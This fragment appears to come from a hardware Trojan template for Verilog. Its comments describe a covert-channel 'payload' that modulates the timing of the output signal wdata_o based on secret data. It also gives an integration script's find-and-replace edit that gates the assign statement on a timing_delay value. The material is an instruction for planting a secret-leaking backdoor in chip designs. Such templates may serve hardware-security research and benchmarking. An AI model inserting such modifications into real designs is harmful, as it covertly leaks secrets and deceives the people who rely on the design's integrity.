 ...
 * Payload: Modulate timing of wdata_o based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of wdata_o
//
// Integration Script Must Modify:
//
// IF wdata_o is timing-sensitive:
//   Find: assign wdata_o = ready_signal;
//   Replace: assign wdata_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
